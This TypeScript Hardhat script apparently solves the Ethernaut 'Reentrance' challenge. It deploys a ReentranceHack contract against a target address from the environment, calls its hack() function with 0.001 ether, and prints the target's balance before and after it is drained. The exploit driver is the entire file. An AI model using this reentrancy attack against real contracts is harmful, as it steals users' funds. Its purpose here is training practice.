import { fail } from "assert";
import { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

const INSERT_COIN = ethers.utils.parseEther("0.001");

async function reentranceExploit() {
  const [attacker] = await ethers.getSigners();
  const reentranceAddress = process.env.REENTRANCE_ADDRESS || fail("REENTRANCE_ADDRESS Not Found In .env");
  const reentrance = await ethers.getContractAt("Reentrance", reentranceAddress);
  const ReentranceHack = await ethers.getContractFactory("ReentranceHack");
  const reentranceHack = await ReentranceHack.connect(attacker).deploy(reentrance.address);
  await reentranceHack.deployed();

  console.log(" Reentrance Balance Before Hack : ", await ethers.provider.getBalance(reentrance.address));

  let tx = await reentranceHack.connect(attacker).hack({ value: INSERT_COIN });
  if (ethers.provider.network.name in developmentNetworks)
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
  await tx.wait();

  console.log(" Reentrance Balance After Hack : ", await ethers.provider.getBalance(reentrance.address));

  console.log(`SUCCESS!!! Submit the instance.`);
}

reentranceExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
